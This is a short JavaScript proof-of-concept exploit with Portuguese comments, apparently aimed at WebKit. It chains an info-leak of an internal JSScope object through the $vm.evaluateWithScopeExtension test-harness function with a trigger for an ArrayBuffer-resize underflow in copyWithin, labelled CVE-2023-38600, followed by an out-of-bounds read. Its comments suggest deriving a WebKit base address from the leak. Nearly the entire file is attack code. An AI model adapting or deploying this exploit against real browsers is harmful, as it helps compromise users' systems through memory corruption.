// logging helper
function log(msg) {
  const pre = document.getElementById("log");
  pre.textContent += msg + "\n";
}

// 1) INFO-LEAK via ProxyObject / get_by_id_with_this
function leakJSScope() {
  log("=== fase 1: info-leak ===");
  // nós vamos abusar de $vm.evaluateWithScopeExtension (WebKit test-harness)
  // para capturar o `this` interno (JSScope object)
  function foo() { foo.lastThisValue = this; }
  let scope = { foo };
  // rodamos muitas vezes para gerar o ProxyObject otimizado
  for (let i = 0; i < 100; i++) {
    $vm.evaluateWithScopeExtension("foo()", scope);
  }
  // agora chamamos sem escopo: deve vazar a referência
  try {
    $vm.evaluateWithScopeExtension("foo()");
  } catch (e) { /* ignora */ }
  let leak = foo.lastThisValue;
  log(">> leak JSScope object: " + leak);
  return leak;
}

// 2) UNDERFLOW / copyWithin (CVE-2023-38600)
function triggerUnderflow() {
  log("=== fase 2: underflow copyWithin ===");
  const ab = new ArrayBuffer(0x1000, { maxByteLength: 0x4000 });
  const u8 = new Uint8Array(ab);

  log("Antes resize: byteLength=" + ab.byteLength);
  function cb() {
    log("  callback: resize->0");
    ab.resize(0);
    return 0;
  }

  try {
    u8.copyWithin(0x20, { valueOf: cb });
    log("copyWithin retornou sem exception");
  } catch (e) {
    log("copyWithin lançou: " + e);
  }
  log("Depois copyWithin: byteLength=" + ab.byteLength);

  // tentativa de leitura fora do limite
  try {
    let oob = new Uint8Array(ab, 0x1000, 4);
    log("Leitura OOB: " + oob[0] + ", " + oob[1] + ", " + oob[2] + ", " + oob[3]);
  } catch (e) {
    log("Leitura OOB lançou: " + e);
  }
}

document.getElementById("run").addEventListener("click", () => {
  log("");  
  let leak = leakJSScope();
  // aqui você pode derivar um endereço base de WebKit a partir do leak,
  // por exemplo: let base = deriveBasePtr(leak);
  // e depois passar esse base para a fase2, se quiser.
  triggerUnderflow();
});
